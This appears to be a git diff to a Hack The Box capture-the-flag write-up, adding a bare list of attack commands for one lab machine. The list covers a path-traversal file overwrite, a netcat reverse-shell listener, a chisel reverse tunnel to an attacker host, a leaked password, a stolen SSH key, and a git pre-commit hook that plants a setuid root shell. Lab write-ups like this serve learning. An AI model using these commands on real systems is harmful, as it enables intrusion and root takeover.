@@ -1,4 +1,28 @@
 ```
+http://10.10.11.164/download
+source.zip
+git log
+http://10.10.11.164/upcloud
+..//app/app/views.py
+nc -lvnp 443
+http://10.10.11.164/0xdf
+ifconfig
+wget http://10.10.14.2:8000/chisel_1.9.0_linux_amd64
+/chisel_1.9.0_linux_amd64 server -p 8000 –reverse
+./chisel_1.9.0_linux_amd64 client 10.10.14.2:8000 R:3000:172.17.0.1:3000
+http://127.0.0.1:3000/
+Soulless_Developer#2022
+http://127.0.0.1:3000/dev01/home-backup/src/branch/main/.ssh/id_rsa
+ssh -i id_rsa dev01@10.10.11.164
+./pspy64
+/usr/local/bin/git-sync
+echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
+ls -l /tmp/0xdf
+/tmp/0xdf -p
+```
+
+
+```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.164
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/bd23ea8e-8d62-47e6-b5dc-85b954b967a3)
